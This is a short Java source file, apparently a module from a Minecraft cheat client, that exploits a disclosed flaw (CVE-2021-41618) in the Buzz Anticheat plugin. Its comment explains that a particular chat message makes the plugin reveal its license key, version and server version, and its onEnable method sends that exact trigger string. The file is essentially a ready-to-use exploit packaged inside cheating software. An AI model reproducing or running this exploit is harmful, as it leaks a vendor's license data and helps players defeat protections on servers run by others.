package me.rhys.client.module.player;

import me.rhys.base.module.Module;
import me.rhys.base.module.data.Category;

public class CVE extends Module {
    public CVE(String name, String description, Category category, int keyCode) {
        super(name, description, category, keyCode);
    }

    /*
        Flaw inside Buzz Anticheat (buzzanticheat.com)
        Found: 24/09/2021
        Fixed: 28/09/2021

       This chat message allows any user to see the License key, version & server version of the product

        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41618
     */

    @Override
    public void onEnable() {
        mc.thePlayer.sendChatMessage("jd9jyQaj=J7fzA:PN4H~*`s}AZP\\39T<we<knAb~4gd+S=-`.3pFkv#FmEP5UMbCJtmq@");
        this.toggle(false);
    }
}
